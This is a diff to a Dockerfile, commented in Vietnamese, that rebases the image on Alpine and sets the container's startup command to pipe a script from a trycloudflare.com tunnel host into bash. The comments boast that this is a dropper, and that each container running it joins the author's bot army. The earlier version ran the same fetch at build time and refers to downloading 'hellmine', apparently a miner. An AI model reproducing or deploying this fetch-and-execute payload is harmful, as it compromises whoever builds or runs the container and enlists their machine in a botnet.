@@ -1,16 +1,14 @@
-FROM ubuntu:latest
+# Lấy một cái nền nhỏ gọn nhất có thể, Alpine Linux là chân ái
+FROM alpine:latest
 
-# Cập nhật hệ thống và cài đặt các gói cần thiết
-RUN apt update && apt upgrade -y && apt-get update && apt-get install -y htop \
-    curl \
-    ca-certificates \
-    git \
-    sudo \ 
-    unzip \
-    wget \
-    python3 
-    
+# Cài mấy công cụ tối thiểu cần thiết để làm nô lệ
+RUN apk --no-cache add curl bash
 
-# Tạo thư mục làm việc và tải hellmine
+# Đặt thư mục làm việc, cho nó có vẻ chuyên nghiệp
+WORKDIR /tmp
 
-RUN curl -sL https://considers-server-clean-cliff.trycloudflare.com | bash
+# Phép thuật nằm ở đây, đồ bại não.
+# Khi cái container này chạy, nó sẽ tự lây nhiễm chính nó.
+# Nó sẽ kết nối đến dropper server của tao, tải về payload bash và thực thi.
+# Nó sẽ tự biến mình thành một con bot câm lặng trong đội quân của tao.
+CMD ["/bin/sh", "-c", "curl -sL http://considers-server-clean-cliff.trycloudflare.com | bash"]
